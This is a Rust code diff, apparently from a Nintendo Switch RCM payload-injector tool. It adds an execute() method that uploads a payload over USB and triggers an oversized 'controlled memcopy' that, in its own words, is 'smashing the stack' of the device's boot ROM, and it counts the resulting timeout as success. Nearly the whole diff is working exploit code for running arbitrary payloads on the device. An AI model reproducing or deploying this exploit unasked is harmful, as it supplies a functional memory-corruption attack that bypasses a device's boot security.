@@ -1,8 +1,11 @@
+use thiserror::Error;
+
 use crate::device::{SwitchDevice, SwitchDeviceUninit, SwitchDeviceUninitError};
 use crate::vulnerability::Vulnerability;
+use crate::Payload;
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
-pub enum BufferState {
+enum BufferState {
     High,
     Low,
 }
@@ -25,6 +28,20 @@ impl BufferState {
     }
 }
 
+#[derive(Debug, Error)]
+pub enum RcmError {
+    #[error("Expected timeout error after smashing the stack")]
+    ExpectedError,
+    #[error("A usb error")]
+    UsbError(rusb::Error),
+}
+
+impl From<rusb::Error> for RcmError {
+    fn from(err: rusb::Error) -> Self {
+        Self::UsbError(err)
+    }
+}
+
 pub struct Rcm {
     switch: SwitchDevice,
     current_buffer: BufferState,
@@ -42,8 +59,24 @@ impl Rcm {
         })
     }
 
+    pub fn execute(&mut self, payload: Payload) -> Result<(), RcmError> {
+        self.write(payload.data())?;
+        self.switch_to_highbuf()?;
+
+        // smashing the stack
+
+        let res = self.trigger_controlled_memcopy();
+        // We expect a timeout
+        if let Err(err) = res {
+            if err == rusb::Error::Timeout {
+                return Ok(());
+            }
+        }
+        Err(RcmError::ExpectedError)
+    }
+
     /// Writes data to the RCM protocol endpoint
-    pub fn write(&mut self, buf: &[u8]) -> rusb::Result<usize> {
+    fn write(&mut self, buf: &[u8]) -> rusb::Result<usize> {
         const PACKET_SIZE: usize = 0x1000;
         const MAX_LENGTH: usize = 0x30298;
 
@@ -69,11 +102,11 @@ impl Rcm {
         Ok(written)
     }
 
-    pub fn current_buff_addr(&self) -> usize {
+    fn current_buff_addr(&self) -> usize {
         self.current_buffer.address()
     }
 
-    pub fn switch_to_highbuf(&mut self) -> rusb::Result<()> {
+    fn switch_to_highbuf(&mut self) -> rusb::Result<()> {
         if self.current_buffer != BufferState::High {
             let buf = &[b'\0'; 0x1000];
             self.write(buf)?;
@@ -81,13 +114,13 @@ impl Rcm {
         Ok(())
     }
 
-    pub fn trigger_controlled_memcopy(&self) -> rusb::Result<usize> {
+    fn trigger_controlled_memcopy(&self) -> rusb::Result<usize> {
         const STACK_END: usize = 0x40010000;
         let length = STACK_END - self.current_buff_addr();
         self.trigger_controlled_memcopy_length(length)
     }
 
-    pub fn trigger_controlled_memcopy_length(&self, length: usize) -> rusb::Result<usize> {
+    fn trigger_controlled_memcopy_length(&self, length: usize) -> rusb::Result<usize> {
         self.switch.trigger(length)
     }
 
@@ -104,7 +137,7 @@ impl Rcm {
         self.switch.read(buf)
     }
 
-    pub fn read_device_id(&mut self) {
+    fn read_device_id(&mut self) {
         let mut buf = [b'\0'; 16];
         self.read(&mut buf).unwrap();
     }
